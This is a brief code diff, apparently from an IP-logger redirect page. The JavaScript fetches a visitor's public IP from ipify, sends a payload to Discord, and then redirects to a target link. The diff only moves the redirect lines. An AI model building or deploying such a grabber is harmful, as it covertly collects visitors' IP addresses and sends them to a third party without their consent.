@@ -48,11 +48,10 @@ fetch("https://api.ipify.org?format=json")
         "Content-Type": "application/json"
       },
       body: JSON.stringify(payload)
-      window.location.href = zielLink;
+      
     }).catch(err => {
       console.error("Fehler beim Senden an Discord:", err);
     });
-    window.location.href = zielLink;
   })
   .catch(err => {
     console.error("Fehler beim Abrufen der IP-Adresse:", err);
